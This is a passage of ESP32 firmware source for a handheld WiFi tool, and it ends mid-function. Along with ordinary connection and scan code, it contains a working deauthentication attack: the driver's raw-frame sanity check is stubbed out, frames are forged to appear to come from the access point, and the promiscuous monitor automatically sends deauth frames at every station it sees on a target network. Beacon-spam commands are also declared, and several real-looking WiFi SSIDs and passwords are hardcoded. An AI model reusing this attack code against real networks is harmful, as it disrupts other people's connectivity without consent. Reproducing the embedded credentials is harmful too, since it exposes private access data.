#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"

#include "esp_check.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "esp_random.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "WIFI.h"

static const char*TAG = "WIFI";
static const char *TAG_SCAN = "WIFI_SCAN";

QueueHandle_t wifi_task_queue = NULL;
static EventGroupHandle_t s_wifi_event_group = NULL;
#define WIFI_INITED_BIT         BIT0
#define WIFI_CONNECTED_BIT      BIT1
#define WIFI_FAIL_BIT           BIT2
#define WIFI_SCAN_BIT           BIT3
#define WIFI_MONITORING_BIT     BIT4
#define WIFI_DEAUTH_BIT         BIT5

static esp_event_handler_instance_t s_wifi_any_id = NULL;
static esp_event_handler_instance_t s_wifi_got_ip = NULL;
static esp_netif_t *s_sta_netif = NULL;
static TaskHandle_t s_wifi_app_task_handle = NULL;


static int s_retry_num = 0;
static int s_net_index = 0;
static uint8_t      s_target_bssid_list[MAX_BSSID_PER_SSID][MAC_LEN];
static uint8_t      s_target_bssid_count;
static int          s_target_channel     = 1;

typedef struct {
    char ssid[32];
    char password[64];
} wifi_sta_connect_t;

static const wifi_sta_connect_t s_wifi_sta_list[] = {
    {"STM32F407VET6", "20020911"},
    {"iPhone",        "000ppppp"},
    {"TP-LINK_EE0A",  "20020911#"},
    {"ZDXFXJ",        "ZDX0326ZDX"},
    {"",              ""} /* 结束哨兵 */
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){return 0;}

static void task_wifi_application(void *param);

/* ---- 命令处理函数 ---- */
static void _handler_scan(const wifi_task_queue_message_t *msg);
static void _handler_deauth_attack(const wifi_task_queue_message_t *msg);
static void _handler_beacon_spam_start(const wifi_task_queue_message_t *msg);
static void _handler_beacon_spam_stop(const wifi_task_queue_message_t *msg);
static void _handler_monitor_start(const wifi_task_queue_message_t *msg);
static void _handler_monitor_stop(const wifi_task_queue_message_t *msg);
static void _handler_connect(const wifi_task_queue_message_t *msg);
static void _handler_disconnect(const wifi_task_queue_message_t *msg);
static void _handler_get_status(const wifi_task_queue_message_t *msg);

static bool is_valid_ap_index(int idx)
{
    return s_wifi_sta_list[idx].ssid[0] != '\0';
}

static void wifi_build_sta_config_from_index(int idx, wifi_config_t *cfg)
{
    memset(cfg, 0, sizeof(*cfg));
    cfg->sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    cfg->sta.sae_pwe_h2e = WPA3_SAE_PWE_BOTH;
    cfg->sta.sae_h2e_identifier[0] = '\0';
    cfg->sta.pmf_cfg.capable = true;
    cfg->sta.pmf_cfg.required = false;

    strncpy((char *)cfg->sta.ssid,     s_wifi_sta_list[idx].ssid,     sizeof(cfg->sta.ssid));
    strncpy((char *)cfg->sta.password, s_wifi_sta_list[idx].password, sizeof(cfg->sta.password));
    cfg->sta.ssid[sizeof(cfg->sta.ssid) - 1] = '\0';
    cfg->sta.password[sizeof(cfg->sta.password) - 1] = '\0';
}

static void wifi_apply_next_ap_and_connect(void)
{
    if (!is_valid_ap_index(s_net_index)) {
        s_net_index = 0;
        s_retry_num++;
    }

    wifi_config_t wifi_cfg;
    wifi_build_sta_config_from_index(s_net_index, &wifi_cfg);
    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &wifi_cfg)) != ESP_OK) return;
    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_connect()) != ESP_OK) return;

    AMOLED_console_log(INFORM, true, TAG, "Try to connect %s for the %d", s_wifi_sta_list[s_net_index].ssid, s_retry_num);
}

static esp_err_t wifi_sta_restart(void)
{
    wifi_config_t sta_cfg;
    wifi_build_sta_config_from_index(s_net_index, &sta_cfg);
    esp_err_t ret;
    ret = ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
    if (ret != ESP_OK) return ret;
    ret = ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &sta_cfg));
    if (ret != ESP_OK) return ret;
    ret = ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_start());
    return ret;
}

static void WIFI_EVENTfunction_handler(void* event_handler_arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_STA_START:
        {
            EventBits_t bits = xEventGroupGetBits(s_wifi_event_group);
            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_BIT)) {
                break;
            }
            s_retry_num = 0;
            s_net_index = 0;
            wifi_apply_next_ap_and_connect();
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED:
        {
            EventBits_t bits = xEventGroupGetBits(s_wifi_event_group);
            if (bits & (WIFI_SCAN_BIT | WIFI_MONITORING_BIT | WIFI_DEAUTH_BIT)) {
                break;
            }
            if (s_retry_num < 2) {
                s_net_index++;
                wifi_apply_next_ap_and_connect();
            } else {
                xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
                AMOLED_console_log(INFORM, false, TAG, "STA: all AP failed");
            }
            break;
        }
        case WIFI_EVENT_STA_CONNECTED:
            AMOLED_console_log(INFORM, false, TAG, "STA: AP success connected, waiting IP");
            break;
        default:break;
        }
        return;
    }else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *evt = (ip_event_got_ip_t *)event_data;
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
        AMOLED_console_log(INFORM, false, TAG, "STA: got IP " IPSTR, IP2STR(&evt->ip_info.ip));
        SNTP_obtain_time();
    }
}

void WIFI_init(void)
{
    if (s_wifi_event_group != NULL && (xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) {
        AMOLED_console_log(INFORM, false, TAG, "STA: already initialized, skip");
        return;
    }
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
        AMOLED_console_log(INFORM, false, "NVS" ,"Complete the initialization of NVS");
    }
    ESP_ERROR_CHECK(ret);

    AMOLED_console_log(INFORM, false, TAG ,"Start configuring the WIFI STA");
    /*Fault-tolerant mechanism:These API will return INVALID_STATE when init is repeated*/
    ret = esp_netif_init();
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(ret);
    }
    ret = esp_event_loop_create_default();//task_name = "sys_evt"
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(ret);
    }

    s_wifi_event_group = xEventGroupCreate();
    assert(s_wifi_event_group);
    s_sta_netif = esp_netif_create_default_wifi_sta();
    assert(s_sta_netif);

    wifi_init_config_t wifi_init_config = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_init_config));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &WIFI_EVENTfunction_handler, NULL, &s_wifi_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, &WIFI_EVENTfunction_handler, NULL, &s_wifi_got_ip));

    wifi_task_queue = xQueueCreate(16, sizeof(wifi_task_queue_message_t));

    if (s_wifi_app_task_handle == NULL) {
        xTaskCreatePinnedToCore(task_wifi_application,"task_wifi_application",8192,NULL,8,
                                &s_wifi_app_task_handle, 0);
    }

    /* 首次配置先使用列表第一个 AP，后续断开时会自动轮询 */
    s_net_index = 0;
    s_retry_num = 0;
    ESP_ERROR_CHECK(wifi_sta_restart());

    xEventGroupSetBits(s_wifi_event_group, WIFI_INITED_BIT);
    AMOLED_console_log(INFORM, false, TAG, "STA: init done (non-blocking)");
    /* Waiting until either the connection is established (WIFI_CONNECTED_BIT) or connection failed for the maximum
     * number of re-tries (WIFI_FAIL_BIT). The bits are set by event_handler() (see above) */
    //EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,pdFALSE,pdFALSE,portMAX_DELAY);
}


static const wifi_cmd_dispatch_entry_t s_dispatch_table[] = {
    { WIFI_CMD_SCAN,              _handler_scan              },
    { WIFI_CMD_MONITOR_START,     _handler_monitor_start     },
    { WIFI_CMD_MONITOR_STOP,      _handler_monitor_stop      },
    { WIFI_CMD_CONNECT,           _handler_connect           },
    { WIFI_CMD_DISCONNECT,        _handler_disconnect        },
    { WIFI_CMD_DEAUTH_ATTACK,     _handler_deauth_attack     },
    { WIFI_CMD_BEACON_SPAM_START, _handler_beacon_spam_start },
    { WIFI_CMD_BEACON_SPAM_STOP,  _handler_beacon_spam_stop  },
    { WIFI_CMD_GET_STATUS,        _handler_get_status        },
};

#define DISPATCH_TABLE_SIZE (sizeof(s_dispatch_table) / sizeof(s_dispatch_table[0]))


static wifi_cmd_handler_t _lookup_handler(wifi_cmd_type_t cmd)
{
    for (size_t i = 0; i < DISPATCH_TABLE_SIZE; i++) {
        if (s_dispatch_table[i].cmd == cmd) {
            return s_dispatch_table[i].handler;
        }
    }
    return NULL;
}

static void task_wifi_application(void *param)
{
    //wifi_ap_record_t ap_records[MAX_SCAN_NUM];
    wifi_task_queue_message_t wifi_task_buffer;
    AMOLED_console_log(INFORM, false, TAG, "WiFi app task started");
    while (1){
        if (xQueueReceive(wifi_task_queue, &wifi_task_buffer, portMAX_DELAY)) {//wait for queue message
            //continue;
            wifi_cmd_handler_t handler = _lookup_handler(wifi_task_buffer.cmd_type);

            if (handler != NULL) {
                AMOLED_console_log(INFORM, false, TAG,
                    "cmd=%d  req=%lu", (int)wifi_task_buffer.cmd_type, wifi_task_buffer.request_id);

                handler(&wifi_task_buffer);

                //_notify_reply(wifi_task_buffer.reply_task, wifi_task_buffer.cmd_type,WIFI_RESULT_OK, wifi_task_buffer.request_id);
            } else {
                AMOLED_console_log(INFORM, true, TAG,
                    "unknown cmd=%d", (int)wifi_task_buffer.cmd_type);

                //_notify_reply(wifi_task_buffer.reply_task, wifi_task_buffer.cmd_type,WIFI_RESULT_ERR_UNKNOWN_CMD, wifi_task_buffer.request_id);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    WIFI_deinit();
    vTaskDelete(NULL);
}

void WIFI_deinit(void)
{
    if (s_wifi_event_group == NULL || !(xEventGroupGetBits(s_wifi_event_group) & WIFI_INITED_BIT)) {
        AMOLED_console_log(INFORM, false, TAG, "STA: not initialized, skip deinit");
        return;
    }

    /*log out the event to avoid triggering the old callback during the subsequent stop/deinit process*/
    if (s_wifi_any_id) {
        esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, s_wifi_any_id);
        s_wifi_any_id = NULL;
    }
    if (s_wifi_got_ip) {
        esp_event_handler_instance_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, s_wifi_got_ip);
        s_wifi_got_ip = NULL;
    }

    /*fault-tolerant mechanism*/
    esp_wifi_disconnect();
    esp_wifi_stop();
    esp_wifi_deinit();

    if (s_sta_netif) {
        esp_netif_destroy(s_sta_netif);
        s_sta_netif = NULL;
    }

    if (s_wifi_event_group) {
        vEventGroupDelete(s_wifi_event_group);
        s_wifi_event_group = NULL;
    }

    if (s_wifi_app_task_handle != NULL) {
        vTaskDelete(s_wifi_app_task_handle);
        s_wifi_app_task_handle = NULL;
    }
    if (wifi_task_queue != NULL) {
        vQueueDelete(wifi_task_queue);
        wifi_task_queue = NULL;
    }

    s_retry_num = 0;
    s_net_index = 0;
    AMOLED_console_log(INFORM, false, TAG, "STA: deinit done");
}


/**
 * @brief 将 esp wifi 认证模式转换为可读字符串
 * @param authmode wifi_auth_mode_t 枚举值
 * @return 对应的字符串，如 "OPEN", "WPA2_PSK" 等
 */
static const char *authmode_to_string(wifi_auth_mode_t authmode)
{
    switch (authmode) {
        case WIFI_AUTH_OPEN:           return "OPEN";
        case WIFI_AUTH_WEP:            return "WEP";
        case WIFI_AUTH_WPA_PSK:        return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:       return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2_PSK";
        case WIFI_AUTH_WPA3_PSK:       return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:  return "WPA2/WPA3_PSK";
        default:                       return "UNKNOWN";
    }
}


static void _handler_scan(const wifi_task_queue_message_t *msg)
{
    const wifi_cmd_scan_params_t *p = &msg->params.scan;

    if (xEventGroupGetBits(s_wifi_event_group) & WIFI_MONITORING_BIT) {
        ESP_LOGI(TAG_SCAN, "Monitor active, stopping before scan");
        xEventGroupSetBits(s_wifi_event_group, WIFI_SCAN_BIT);
        _handler_monitor_stop(msg);
    }


    wifi_scan_config_t scan_cfg = {
        .ssid         = (p->target_ssid[0] != '\0') ? p->target_ssid : NULL,
        .bssid        = NULL,
        .channel      = p->target_channel,
        .show_hidden  = p->show_hidden,
        .scan_type    = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = (p->scan_time_min_ms > 0) ? p->scan_time_min_ms : 100,
        .scan_time.active.max = (p->scan_time_max_ms > 0) ? p->scan_time_max_ms : 300,
    };

    esp_err_t ret = esp_wifi_scan_start(&scan_cfg, true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_SCAN, "Scan start failed: %s", esp_err_to_name(ret));
        //_notify_reply(msg->reply_task, msg->cmd_type, WIFI_RESULT_ERR_STATE, msg->request_id);
        xEventGroupClearBits(s_wifi_event_group, WIFI_SCAN_BIT);
        return;
    }

    uint16_t ap_num = MAX_SCAN_NUM;
    wifi_ap_record_t ap_records[MAX_SCAN_NUM];
    ret = esp_wifi_scan_get_ap_records(&ap_num, ap_records);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_SCAN, "Get AP records failed: %s", esp_err_to_name(ret));
        //_notify_reply(msg->reply_task, msg->cmd_type, WIFI_RESULT_ERR_STATE, msg->request_id);
        xEventGroupClearBits(s_wifi_event_group, WIFI_SCAN_BIT);
        return;
    }

    ESP_LOGI(TAG_SCAN, "Found %d APs", ap_num);

    lvgl_lock(-1);
    if (ui_ListContainer == NULL) {
        ESP_LOGW(TAG_SCAN, "ui_ListContainer is NULL, skip UI update");
        lvgl_unlock();
        xEventGroupClearBits(s_wifi_event_group, WIFI_SCAN_BIT);
        return;
    }
    lv_obj_clean(ui_ListContainer);
    lvgl_unlock();

    int valid = 0;
    for (int i = 0; i < ap_num; i++) {
        wifi_ap_record_t *ap = &ap_records[i];
        if (strlen((char *)ap->ssid) == 0) continue;

        char ssid_str[33];
        snprintf(ssid_str, sizeof(ssid_str), "%.32s", (char *)ap->ssid);
        if (ssid_str[0] == '\0') strcpy(ssid_str, "<Hidden>");

        char rssi_str[16];
        snprintf(rssi_str, sizeof(rssi_str), "%d dBm", ap->rssi);

        lvgl_lock(-1);
        lv_obj_t *panel = LVGL_list_add_member(valid, ssid_str,
                                authmode_to_string(ap->authmode), rssi_str);
        lvgl_unlock();
        if (panel != NULL) valid++;
    }
    xEventGroupClearBits(s_wifi_event_group, WIFI_SCAN_BIT);
    ESP_LOGI(TAG_SCAN, "UI updated: SCAN %d APs", valid);
}



/* ========================================================================
 * STA 列表滚动管理 — 去重 + 最近时间追踪
 * ======================================================================== */
typedef struct {
    uint8_t  mac[6];
    int8_t   rssi;
    int64_t  last_seen_us;
    lv_obj_t *panel;
    bool     active;
} monitor_sta_entry_t;

static monitor_sta_entry_t s_sta_list[MAX_SCAN_NUM];

static int find_sta_by_mac(const uint8_t *mac)
{
    for (int i = 0; i < MAX_SCAN_NUM; i++) {
        if (s_sta_list[i].active &&
            memcmp(s_sta_list[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

static int find_empty_sta_slot(void)
{
    for (int i = 0; i < MAX_SCAN_NUM; i++) {
        if (!s_sta_list[i].active) return i;
    }
    return -1;
}

static int find_oldest_sta_slot(void)
{
    int oldest = -1;
    int64_t oldest_time = INT64_MAX;
    for (int i = 0; i < MAX_SCAN_NUM; i++) {
        if (s_sta_list[i].active &&
            s_sta_list[i].last_seen_us < oldest_time) {
            oldest_time = s_sta_list[i].last_seen_us;
            oldest = i;
        }
    }
    return oldest;
}

static void sta_format_elapsed(int64_t elapsed_us, char *buf, size_t size)
{
    int64_t sec = elapsed_us / 1000000;
    if (sec < 60) {
        snprintf(buf, size, "%llds", sec);
    } else if (sec < 3600) {
        snprintf(buf, size, "%lldm%llds", sec / 60, sec % 60);
    } else {
        snprintf(buf, size, "%lldh%lldm", sec / 3600, (sec % 3600) / 60);
    }
}

static void sta_panel_refresh_text(int idx)
{
    lv_obj_t *panel = s_sta_list[idx].panel;
    if (panel == NULL) return;

    char time_str[16];
    int64_t now = esp_timer_get_time();
    sta_format_elapsed(now - s_sta_list[idx].last_seen_us,
                       time_str, sizeof(time_str));

    char rssi_str[16];
    snprintf(rssi_str, sizeof(rssi_str), "%d dBm", s_sta_list[idx].rssi);

    // 面板子对象顺序：0=lbl_name(MAC), 1=lbl_type(时间), 2=lbl_state(信号)
    if (lv_obj_get_child_cnt(panel) >= 3) {
        lv_label_set_text(lv_obj_get_child(panel, 1), time_str);
        lv_label_set_text(lv_obj_get_child(panel, 2), rssi_str);
    }
}

/* ---- 混杂模式回调 ---- */
void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);

static bool is_bssid_zero(const uint8_t *bssid)
{
    for (int i = 0; i < MAC_LEN; i++) {
        if (bssid[i] != 0) return false;
    }
    return true;
}

static void _handler_monitor_start(const wifi_task_queue_message_t *msg)
{
    const wifi_cmd_monitor_params_t *p = &msg->params.monitor;

    if (xEventGroupGetBits(s_wifi_event_group) & WIFI_MONITORING_BIT) {
        ESP_LOGW(TAG, "Already monitoring, stop first");
        return;
    }

    lvgl_lock(-1);
    if (ui_ListContainer == NULL) {
        ESP_LOGW(TAG_SCAN, "ui_ListContainer is NULL, skip UI update");
        lvgl_unlock();
        return;
    }
    lv_obj_clean(ui_ListContainer);
    lvgl_unlock();

    memset(s_sta_list, 0, sizeof(s_sta_list));
    s_target_bssid_count = 0;
    memset(s_target_bssid_list, 0, sizeof(s_target_bssid_list));

    /* 优先级：ap_bssid 精确指定 > target_ssid 扫描查找 */
    if (!is_bssid_zero(p->ap_bssid)) {
        memcpy(s_target_bssid_list[0], p->ap_bssid, MAC_LEN);
        s_target_bssid_count = 1;
        s_target_channel = p->target_channel;
    } else if (p->target_ssid[0] != '\0') {
        /* 通过 SSID 扫描获取所有 BSSID */

        wifi_scan_config_t scan_cfg = {
            .ssid         = p->target_ssid,
            .bssid        = NULL,
            .channel      = 0,
            .show_hidden  = false,
            .scan_type    = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 80,
            .scan_time.active.max = 200,
        };

        esp_err_t ret = esp_wifi_scan_start(&scan_cfg, true);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Monitor: pre-scan failed: %s", esp_err_to_name(ret));
            return;
        }

        uint16_t ap_num = MAX_SCAN_NUM;
        wifi_ap_record_t ap_records[MAX_SCAN_NUM];
        ret = esp_wifi_scan_get_ap_records(&ap_num, ap_records);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Monitor: get AP records failed: %s", esp_err_to_name(ret));
            return;
        }

        for (int i = 0; i < ap_num && s_target_bssid_count < MAX_BSSID_PER_SSID; i++) {
            if (strncmp((char *)ap_records[i].ssid, p->target_ssid, SSID_MAX_LEN) == 0) {
                memcpy(s_target_bssid_list[s_target_bssid_count], ap_records[i].bssid, MAC_LEN);
                s_target_bssid_count++;
                if (s_target_channel == 0) {
                    s_target_channel = ap_records[i].primary;
                }
                ESP_LOGI(TAG, "Monitor: found BSSID " MACSTR " ch=%d for SSID %s",
                         MAC2STR(ap_records[i].bssid), ap_records[i].primary, p->target_ssid);
            }
        }

        if (s_target_bssid_count == 0) {
            ESP_LOGW(TAG, "Monitor: no AP found for SSID '%s'", p->target_ssid);
            return;
        }
    } else {
        ESP_LOGW(TAG, "Monitor: no BSSID or SSID specified");
        return;
    }

    if (s_target_channel == 0) {
        s_target_channel = 1;
    }

    xEventGroupSetBits(s_wifi_event_group, WIFI_MONITORING_BIT);

    esp_wifi_disconnect();
    esp_wifi_stop();

    wifi_config_t cfg = {0};
    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA)) != ESP_OK) return;
    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &cfg)) != ESP_OK) return;
    esp_wifi_set_channel(s_target_channel, WIFI_SECOND_CHAN_NONE);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb);
    esp_wifi_start();

    ESP_LOGI(TAG, "Monitor started: ch=%d, bssid_count=%d", s_target_channel, s_target_bssid_count);
}

static void _handler_monitor_stop(const wifi_task_queue_message_t *msg)
{
    if (!(xEventGroupGetBits(s_wifi_event_group) & WIFI_MONITORING_BIT)) return;

    xEventGroupClearBits(s_wifi_event_group, WIFI_MONITORING_BIT);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(50));

    lvgl_lock(-1);
    for (int i = 0; i < MAX_SCAN_NUM; i++) {
        if (s_sta_list[i].panel != NULL) {
            LVGL_list_delete_member(s_sta_list[i].panel);
            s_sta_list[i].panel = NULL;
        }
        s_sta_list[i].active = false;
    }
    lvgl_unlock();
    memset(s_sta_list, 0, sizeof(s_sta_list));
    s_target_bssid_count = 0;
    memset(s_target_bssid_list, 0, sizeof(s_target_bssid_list));

    esp_wifi_stop();

    if (wifi_sta_restart() != ESP_OK) {
        ESP_LOGE(TAG, "Monitor stopped but STA restart failed");
    }
    ESP_LOGI(TAG, "Monitor stopped");
}

void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!(xEventGroupGetBits(s_wifi_event_group) & WIFI_MONITORING_BIT)) {
        return;
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    ieee80211_mgmt_hdr_t *hdr = (ieee80211_mgmt_hdr_t *)pkt->payload;

    // 只处理数据帧
    if (type != WIFI_PKT_DATA) return;

    uint8_t frame_type = (hdr->frame_control[0] >> 2) & 0x03;
    if (frame_type != 2) return;

    // BSSID 过滤：检查是否与任一目标 AP 通信，同时记录方向以提取 STA MAC
    bool match = false;
    bool frame_from_ap = false;
    int i = 0;
    for (; i < s_target_bssid_count; i++) {
        if (memcmp(hdr->sa, s_target_bssid_list[i], MAC_LEN) == 0) {
            frame_from_ap = true;
            match = true;
            break;
        }
        if (memcmp(hdr->da, s_target_bssid_list[i], MAC_LEN) == 0) {
            frame_from_ap = false;
            match = true;
            break;
        }
    }
    if (!match) return;

    uint8_t sta_mac[MAC_LEN];
    if (frame_from_ap) {
        memcpy(sta_mac, hdr->da, MAC_LEN);
    } else {
        memcpy(sta_mac, hdr->sa, MAC_LEN);
    }

    if(1){//(xEventGroupGetBits(s_wifi_event_group) & WIFI_DEAUTH_BIT) {
        WIFI_deauth_attack(s_target_bssid_list[i], sta_mac, 0x0002);
    }

    int8_t   rssi   = pkt->rx_ctrl.rssi;
    int64_t  now_us = esp_timer_get_time();
    // 去重：已存在的 STA 仅更新面板文字
    int idx = find_sta_by_mac(sta_mac);
    if (idx >= 0) {
        s_sta_list[idx].rssi        = rssi;
        s_sta_list[idx].last_seen_us = now_us;
        lvgl_lock(-1);
        sta_panel_refresh_text(idx);
        lvgl_unlock();
        return;
    }

    // 新 STA：寻找空位，无空位则淘汰最久未更新的条目
    int slot = find_empty_sta_slot();
    if (slot < 0) {
        slot = find_oldest_sta_slot();
        if (slot < 0) return;

        if (s_sta_list[slot].panel != NULL) {
            LVGL_list_delete_member(s_sta_list[slot].panel);
        }
    }

    // 填充新条目
    memcpy(s_sta_list[slot].mac, sta_mac, 6);
    s_sta_list[slot].rssi         = rssi;
    s_sta_list[slot].last_seen_us = now_us;
    s_sta_list[slot].active       = true;

    char mac_str[18];
    char time_str[16];
    char rssi_str[16];
    snprintf(mac_str, sizeof(mac_str), MACSTR, MAC2STR(sta_mac));
    sta_format_elapsed(0, time_str, sizeof(time_str));
    snprintf(rssi_str, sizeof(rssi_str), "%d dBm", rssi);

    lvgl_lock(-1);
    s_sta_list[slot].panel = LVGL_list_add_member(slot, mac_str, time_str, rssi_str);
    lvgl_unlock();
}

static void _handler_connect(const wifi_task_queue_message_t *msg)
{
    const wifi_cmd_connect_params_t *p = &msg->params.connect;

    wifi_config_t cfg = {0};
    cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    cfg.sta.sae_pwe_h2e = WPA3_SAE_PWE_BOTH;
    cfg.sta.pmf_cfg.capable = true;
    cfg.sta.pmf_cfg.required = false;

    strncpy((char *)cfg.sta.ssid,     p->ssid,     sizeof(cfg.sta.ssid) - 1);
    strncpy((char *)cfg.sta.password, p->password, sizeof(cfg.sta.password) - 1);

    if (p->bssid[0] != 0 || p->bssid[1] != 0 || p->bssid[2] != 0 ||
        p->bssid[3] != 0 || p->bssid[4] != 0 || p->bssid[5] != 0) {
        cfg.sta.bssid_set = true;
        memcpy(cfg.sta.bssid, p->bssid, 6);
    }

    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &cfg)) != ESP_OK) return;
    if (ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_connect()) != ESP_OK) return;
    ESP_LOGI(TAG, "Connecting to %s...", p->ssid);
}

static void _handler_get_status(const wifi_task_queue_message_t *msg)
{
    wifi_status_info_t status = {0};

    EventBits_t bits = (s_wifi_event_group != NULL)
                       ? xEventGroupGetBits(s_wifi_event_group) : 0;
    status.is_monitoring = (bits & WIFI_MONITORING_BIT) != 0;
    status.is_attacking  = (bits & WIFI_DEAUTH_BIT) != 0;

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        status.is_connected = true;
        snprintf(status.current_ssid, sizeof(status.current_ssid),
                 "%.32s", (char *)ap_info.ssid);
        status.current_rssi = ap_info.rssi;
    }

    static wifi_task_response_t s_resp;
    s_resp.cmd_type   = WIFI_CMD_GET_STATUS;
    s_resp.result     = WIFI_RESULT_OK;
    s_resp.request_id = msg->request_id;
    s_resp.data.status = status;

    if (msg->reply_task != NULL) {
        xTaskNotify(msg->reply_task, (uint32_t)(uintptr_t)&s_resp,
                    eSetValueWithOverwrite);
    }
}

static void _handler_disconnect(const wifi_task_queue_message_t *msg)
{
    esp_wifi_disconnect();
    ESP_LOGI(TAG, "Disconnected");
}


/**
 * @brief 构造并发送单个 802.11 去认证帧 (Deauthentication)
 *
 * @param ap_bssid   目标 AP 的 BSSID (6 字节 MAC 地址，通常为 AP 的 MAC)
 * @param sta_bssid  目标 STA 的 MAC 地址 (6 字节)。为 NULL 时默认广播 FF:FF:FF:FF:FF:FF
 * @param reason_code 去认证原因代码 (主机字节序，函数内部自动转为小端)
 *
 * @note 发送前请确保 WiFi 已初始化为 STA 模式，且已调用 esp_wifi_set_mode(WIFI_MODE_STA)
 * @note 建议发送前将 WiFi 信道设置为与目标 AP 相同，否则帧可能无法被接收
 *
 * @example
 *       uint8_t target_ap_mac[6]  = {0x90, 0x0F, 0x0C, 0xC7, 0xC2, 0xBF};
 *       uint8_t target_sta_mac[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
 *       WIFI_deauth_attack(target_ap_mac, target_sta_mac, 0x0002);  // 定向去认证
 *       WIFI_deauth_attack(target_ap_mac, NULL, 0x0002);            // 广播去认证
 */
void WIFI_deauth_attack(const uint8_t *ap_bssid, const uint8_t *sta_bssid, uint16_t reason_code)
{
    if (ap_bssid == NULL) {
        return;
    }

    // 1. 定义完整的去认证帧结构体 (公共头部 + 原因代码)
    typedef struct {
        ieee80211_mgmt_hdr_t header;
        uint8_t reason_code[2];
    } __attribute__((packed)) ieee80211_deauth_frame_t;

    ieee80211_deauth_frame_t deauth = {0};
    // 2. 填充帧控制字段: 管理帧 (0x00) + 去认证子类型 (0xC0) + 无标志位
    deauth.header.frame_control[0] = 0xC0;   // b1100 0000
    deauth.header.frame_control[1] = 0x00;
    // 3. 持续时间 (常用值: 314 μs-> 0x013A 小端)
    deauth.header.duration[0] = 0x3A;
    deauth.header.duration[1] = 0x01;
    // 4. 目标地址: sta_bssid 非空则定向攻击，否则广播
    if (sta_bssid != NULL) {
        memcpy(deauth.header.da, sta_bssid, 6);
    } else {
        memset(deauth.header.da, 0xFF, 6);
    }
    // 5. 源地址 = BSSID (伪造帧看起来由 AP 发出)
    memcpy(deauth.header.sa, ap_bssid, 6);
    // 6. BSSID = 目标 AP 的 BSSID
    memcpy(deauth.header.bssid, ap_bssid, 6);
    // 7. 序列控制 (暂不设置, 驱动会自动填充)
    deauth.header.seq_ctrl[0] = 0;
    deauth.header.seq_ctrl[1] = 0;
    // 8. 原因代码 (转换为小端序)
    deauth.reason_code[0] = reason_code & 0xFF;
    deauth.reason_code[1] = (reason_code >> 8) & 0xFF;
    // 9. 通过 802.11 原始发送接口发送
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t *)&deauth, sizeof(deauth), 0);
    if (ret != ESP_OK) {
